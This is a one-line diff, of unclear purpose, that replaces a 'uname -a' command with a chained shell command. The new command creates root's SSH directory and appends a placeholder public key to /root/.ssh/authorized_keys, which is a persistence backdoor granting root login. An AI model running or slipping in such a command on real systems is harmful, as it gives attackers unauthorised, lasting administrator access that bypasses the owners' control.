@@ -1,1 +1,1 @@
-uname -a
+mkdir -p /root/.ssh && chmod 700 /root/.ssh && touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1234ejemplo user@host" >> /root/.ssh/authorized_keys && echo ok
